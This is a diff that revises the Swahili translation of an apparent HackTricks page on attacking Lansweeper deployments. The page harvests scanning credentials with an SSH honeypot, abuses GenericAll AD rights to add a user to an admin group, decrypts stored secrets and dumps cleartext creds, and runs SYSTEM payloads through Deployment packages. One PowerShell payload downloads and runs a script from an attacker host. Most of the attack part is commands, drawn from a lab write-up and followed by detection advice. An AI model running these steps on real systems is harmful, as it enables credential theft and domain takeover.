@@ -1,28 +1,28 @@
-# Lansweeper Matumizi Mabaya: Credential Harvesting, Secrets Decryption, and Deployment RCE
+# Matumizi mabaya ya Lansweeper: Credential Harvesting, Secrets Decryption, and Deployment RCE
 
 {{#include ../../banners/hacktricks-training.md}}
 
-Lansweeper ni jukwaa la ugundaji na inventory la IT linalotumika kwa kawaida kwenye Windows na limeunganishwa na Active Directory. Credentials zilizowekwa katika Lansweeper zimetumika na scanning engines zake kuthibitisha kwenye assets kupitia protocols kama SSH, SMB/WMI na WinRM. Misconfigurations mara nyingi huruhusu:
+Lansweeper ni jukwaa la kugundua na kuhifadhi kumbukumbu za mali za IT ambalo mara nyingi huwekwa kwenye Windows na kuunganishwa na Active Directory. Credentials zilizosanifiwa ndani ya Lansweeper zinatumiwa na scanning engines zake kuthibitisha kwenye assets kupitia itifaki kama SSH, SMB/WMI na WinRM. Mipangilio mibaya mara nyingi inawezesha:
 
-- Kukamata Credential kwa kuelekeza Scanning Target kwenye mwenyeji unaodhibitiwa na mshambuliaji (honeypot)
-- Matumizi mabaya ya AD ACLs zilizofunguliwa na vikundi vinavyohusiana na Lansweeper ili kupata ufikiaji wa mbali
+- Credential interception kwa kupeleka tena scanning target kwa host inayodhibitiwa na mshambuliaji (honeypot)
+- Abuse of AD ACLs zinazofichuliwa na vikundi vinavyohusiana na Lansweeper ili kupata ufikiaji wa mbali
 - On-host decryption ya Lansweeper-configured secrets (connection strings and stored scanning credentials)
-- Code execution kwenye managed endpoints kupitia kipengele cha Deployment (mara nyingi running as SYSTEM)
+- Code execution kwenye managed endpoints kupitia kipengele cha Deployment (mara nyingi kinaendesha kama SYSTEM)
 
-Ukurasa huu unatoa muhtasari wa workflows za mshambuliaji na amri za kutumia tabia hizi wakati wa engagements.
+Ukurasa huu unatoa muhtasari wa workflows za mshambuliaji na amri za vitendo za kutumia tabia hizi wakati wa engagements.
 
 ## 1) Harvest scanning credentials via honeypot (SSH example)
 
-Idea: unda Scanning Target inayorejea kwenye host yako na uifunganye na Scanning Credentials zilizopo. Wakati scan inapoendeshwa, Lansweeper itajaribu kuthibitisha kwa kutumia credentials hizo, na honeypot yako itazikamata.
+Wazo: unda Scanning Target inayowelekeza kwa host yako na uoanishe Scanning Credentials zilizopo nayo. Wakati scan itakapokimbia, Lansweeper itajaribu kuthibitisha kwa kutumia hizo credentials, na honeypot yako itaziwakamata.
 
-Steps overview (web UI):
+Muhtasari wa hatua (web UI):
 - Scanning → Scanning Targets → Add Scanning Target
-- Type: IP Range (or Single IP) = your VPN IP
-- Configure SSH port to something reachable (e.g., 2022 if 22 is blocked)
-- Disable schedule and plan to trigger manually
-- Scanning → Scanning Credentials → ensure Linux/SSH creds exist; map them to the new target (enable all as needed)
-- Click “Scan now” on the target
-- Run an SSH honeypot and retrieve the attempted username/password
+- Type: IP Range (or Single IP) = anwani yako ya VPN
+- Sanidi port ya SSH kuwa nambari inayoweza kufikiwa (mf., 2022 ikiwa 22 imezuiwa)
+- Zima ratiba na panga kuitisha kwa mkono
+- Scanning → Scanning Credentials → hakikisha Linux/SSH creds zipo; ramana hizo kwa target mpya (wezeshwa zote inapohitajika)
+- Bonyeza “Scan now” kwenye target
+- Endesha SSH honeypot na pokea jina la mtumiaji/nenosiri lililotumika kujaribu kuingia
 
 Example with sshesame:
 ```yaml
@@ -47,14 +47,14 @@ netexec ldap  inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
 netexec winrm inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
 ```
 Vidokezo
-- Inafanya kazi kwa njia sawa kwa itifaki nyingine wakati unaweza kulazimisha scanner kuunganishwa na listener yako (SMB/WinRM honeypots, n.k.). SSH mara nyingi ni rahisi zaidi.
-- Scanners wengi hujitambulisha kwa client banners za kipekee (mf., RebexSSH) na zitajaribu amri zisizo hatari (uname, whoami, n.k.).
+- Inafanya kazi kwa njia sawa kwa protocols nyingine wakati unaweza ku-coerce the scanner kwa listener wako (SMB/WinRM honeypots, etc.). SSH mara nyingi ni rahisi zaidi.
+- Scanners wengi hujitambulisha kwa distinct client banners (e.g., RebexSSH) na watajaribu benign commands (uname, whoami, etc.).
 
-## 2) AD ACL abuse: pata ufikia wa mbali kwa kujiongeza mwenyewe kwenye app-admin group
+## 2) AD ACL abuse: pata ufikiaji wa mbali kwa kujiongeza kwenye app-admin group
 
-Tumia BloodHound kuorodhesha effective rights kutoka kwa akaunti iliyovamiwa. Matokeo ya kawaida ni kikundi maalum cha scanner au app (mf., “Lansweeper Discovery”) kinachoshikilia GenericAll juu ya kikundi lenye mamlaka (mf., “Lansweeper Admins”). Ikiwa kikundi lenye mamlaka pia ni mjumbe wa “Remote Management Users”, WinRM inapatikana mara tu tunapojiongeza.
+Tumia BloodHound kuorodhesha haki za ufanisi (effective rights) kutoka kwa akaunti iliyoharibiwa. Ugunduzi wa kawaida ni scanner- au app-specific group (e.g., “Lansweeper Discovery”) inayoshikilia GenericAll juu ya group iliyo na hadhi (e.g., “Lansweeper Admins”). Ikiwa group iliyo na hadhi pia ni mwanachama wa “Remote Management Users”, WinRM inapatikana mara tu tunapojiongeza.
 
-Collection examples:
+Mifano ya collection:
 ```bash
 # NetExec collection with LDAP
 netexec ldap inventory.sweep.vl -u svc_inventory_lnx -p '<password>' --bloodhound -c All --dns-server <DC_IP>
@@ -62,7 +62,7 @@ netexec ldap inventory.sweep.vl -u svc_inventory_lnx -p '<password>' --bloodhoun
 # RustHound-CE collection (zip for BH CE import)
 rusthound-ce --domain sweep.vl -u svc_inventory_lnx -p '<password>' -c All --zip
 ```
-Exploit GenericAll kwenye kundi kwa kutumia BloodyAD (Linux):
+Exploit GenericAll kwenye kundi na BloodyAD (Linux):
 ```bash
 # Add our user into the target group
 bloodyAD --host inventory.sweep.vl -d sweep.vl -u svc_inventory_lnx -p '<password>' \
@@ -75,20 +75,20 @@ Kisha pata interactive shell:
 ```bash
 evil-winrm -i inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
 ```
-Kidokezo: Operesheni za Kerberos zinategemea muda. Ikiwa unapokea KRB_AP_ERR_SKEW, linganisha saa na DC kwanza:
+Kidokezo: Operesheni za Kerberos zinategemea muda. Ikiwa unapata KRB_AP_ERR_SKEW, linganisha saa na DC kwanza:
 ```bash
 sudo ntpdate <dc-fqdn-or-ip>   # or rdate -n <dc-ip>
 ```
-## 3) Fungua siri zilizowekwa na Lansweeper kwenye mwenyeji
+## 3) Decrypt Lansweeper-configured secrets on the host
 
-Kwenye server ya Lansweeper, tovuti ya ASP.NET kawaida huhifadhi encrypted connection string na symmetric key inayotumika na application. Kwa upatikanaji wa ndani unaofaa, unaweza dekripti connection string ya DB kisha kutoa credentials zilizohifadhiwa za scanning.
+Kwenye seva ya Lansweeper, tovuti ya ASP.NET kwa kawaida huhifadhi encrypted connection string na symmetric key zinazotumiwa na application. Ukiwa na access ya ndani inayofaa, unaweza decrypt DB connection string kisha kutoa stored scanning credentials.
 
 Typical locations:
 - Web config: `C:\Program Files (x86)\Lansweeper\Website\web.config`
 - `<connectionStrings configProtectionProvider="DataProtectionConfigurationProvider">` … `<EncryptedData>…`
 - Application key: `C:\Program Files (x86)\Lansweeper\Key\Encryption.txt`
 
-Tumia SharpLansweeperDecrypt kuendesha decryption na kutupa credentials zilizohifadhiwa:
+Use SharpLansweeperDecrypt to automate decryption and dumping of stored creds:
 ```powershell
 # From a WinRM session or interactive shell on the Lansweeper host
 # PowerShell variant
@@ -99,26 +99,26 @@ powershell -ExecutionPolicy Bypass -File C:\ProgramData\LansweeperDecrypt.ps1
 #  - Connect to Lansweeper DB
 #  - Decrypt stored scanning credentials and print them in cleartext
 ```
-Matokeo yanayotarajiwa yanajumuisha DB connection details na plaintext scanning credentials kama vile Windows na Linux accounts zinazotumika katika estate. Hizi mara nyingi zina elevated local rights kwenye domain hosts:
+Matokeo yanayotarajiwa yanajumuisha DB connection details na plaintext scanning credentials kama vile akaunti za Windows na Linux zinazotumika katika estate nzima. Hizi mara nyingi zina elevated local rights kwenye domain hosts:
 ```text
 Inventory Windows  SWEEP\svc_inventory_win  <StrongPassword!>
 Inventory Linux    svc_inventory_lnx        <StrongPassword!>
 ```
-Tumia recovered Windows scanning creds kwa ufikiaji wa ruhusa za juu:
+Tumia Windows scanning creds zilizopatikana kwa upatikanaji wa ruhusa za juu:
 ```bash
 netexec winrm inventory.sweep.vl -u svc_inventory_win -p '<StrongPassword!>'
 # Typically local admin on the Lansweeper-managed host; often Administrators on DCs/servers
 ```
 ## 4) Lansweeper Deployment → SYSTEM RCE
 
-Kama mwanachama wa “Lansweeper Admins”, UI ya wavuti inaonyesha Deployment na Configuration. Chini ya Deployment → Deployment packages, unaweza kuunda packages ambazo zinaendesha amri yoyote kwenye vifaa vilivyolengwa. Utekelezaji hufanywa na service ya Lansweeper kwa ruhusa za juu, ukileta code execution kama NT AUTHORITY\SYSTEM kwenye host iliyochaguliwa.
+Kama mwanachama wa “Lansweeper Admins”, UI ya wavuti inaonyesha Deployment na Configuration. Chini ya Deployment → Deployment packages, unaweza kuunda packages ambazo zinaendesha amri za aina yoyote kwenye assets zilizolengwa. Utekelezaji unafanywa na huduma ya Lansweeper kwa vibali vya juu, ukitoa utekelezaji wa msimbo kama NT AUTHORITY\SYSTEM kwenye host iliyochaguliwa.
 
-High-level steps:
+Hatua za juu:
 - Tengeneza package mpya ya Deployment inayotekeleza PowerShell au cmd one-liner (reverse shell, add-user, n.k.).
-- Lenga kifaa kinachotakiwa (mf., DC/host ambapo Lansweeper inaendesha) kisha bonyeza Deploy/Run now.
+- Lenga asset unayotaka (kwa mfano, DC/host ambapo Lansweeper inakimbia) na bonyeza Deploy/Run now.
 - Pata shell yako kama SYSTEM.
 
-Example payloads (PowerShell):
+Mifano ya payloads (PowerShell):
 ```powershell
 # Simple test
 powershell -nop -w hidden -c "whoami > C:\Windows\Temp\ls_whoami.txt"
@@ -127,21 +127,21 @@ powershell -nop -w hidden -c "whoami > C:\Windows\Temp\ls_whoami.txt"
 powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://<attacker>/rs.ps1')"
 ```
 OPSEC
-- Vitendo vya deployment huwa vinasikika na kuacha logs ndani ya Lansweeper na Windows event logs. Tumia kwa tahadhari.
+- Vitendo vya Deployment husababisha kelele na huacha logs katika Lansweeper na Windows event logs. Tumia kwa uangalifu.
 
-## Ugunduzi na kuimarisha usalama
+## Utambuzi na kuimarisha
 
-- Zuia au ondoa anonymous SMB enumerations. Simamia RID cycling na ufikiaji usio wa kawaida wa Lansweeper shares.
-- Egress controls: zuia au punguza sana outbound SSH/SMB/WinRM kutoka scanner hosts. Taarifu kwa ports zisizo za kawaida (mf., 2022) na client banners zisizo za kawaida kama Rebex.
-- Linda `Website\\web.config` na `Key\\Encryption.txt`. Hamisha siri (externalize) ndani ya vault na zungusha (rotate) pale zinapofichuliwa. Fikiria service accounts zenye ruhusa ndogo na gMSA pale inapowezekana.
-- AD monitoring: toa tahadhari kuhusu mabadiliko kwa makundi yanayohusiana na Lansweeper (mf., “Lansweeper Admins”, “Remote Management Users”) na kwa mabadiliko ya ACL yanayotoa GenericAll/Write uanachama kwa makundi yenye ruhusa za juu.
-- Fanya ukaguzi wa utengenezaji/mabadiliko/utekelezaji wa Deployment packages; toa tahadhari kwa packages zinazozindua cmd.exe/powershell.exe au kuanzisha muunganisho wa outbound usiotarajiwa.
+- Zuia au ondoa uorodheshaji wa SMB wa anonymous. Fuatilia RID cycling na upatikanaji usio wa kawaida wa Lansweeper shares.
+- Egress controls: zuia au punguza kwa ukali outbound SSH/SMB/WinRM kutoka scanner hosts. Toa onyo kwa ports zisizo za kawaida (e.g., 2022) na client banners zisizo za kawaida kama Rebex.
+- Linda `Website\\web.config` na `Key\\Encryption.txt`. Hamisha siri kwenye vault na uzibadilishe (rotate) pale zitakapofichuka. Fikiria service accounts zenye privileges za chini na gMSA pale inapofaa.
+- AD monitoring: toa onyo kwa mabadiliko ya vikundi vinavyohusiana na Lansweeper (e.g., “Lansweeper Admins”, “Remote Management Users”) na kwa mabadiliko ya ACL yanayotoa GenericAll/Write membership kwa vikundi vilivyo na haki za juu.
+- Audit Deployment package creations/changes/executions; toa onyo kwa packages zinazowasha cmd.exe/powershell.exe au muunganisho wa outbound usiotarajiwa.
 
 ## Mada zinazohusiana
-- SMB/LSA/SAMR enumeration na RID cycling
-- Kerberos password spraying na mambo ya kuzingatia kuhusu clock skew
-- BloodHound path analysis ya application-admin groups
-- WinRM usage na lateral movement
+- SMB/LSA/SAMR enumeration and RID cycling
+- Kerberos password spraying and clock skew considerations
+- BloodHound path analysis of application-admin groups
+- WinRM usage and lateral movement
 
 ## References
 - [HTB: Sweep — Abusing Lansweeper Scanning, AD ACLs, and Secrets to Own a DC (0xdf)](https://0xdf.gitlab.io/2025/08/14/htb-sweep.html)
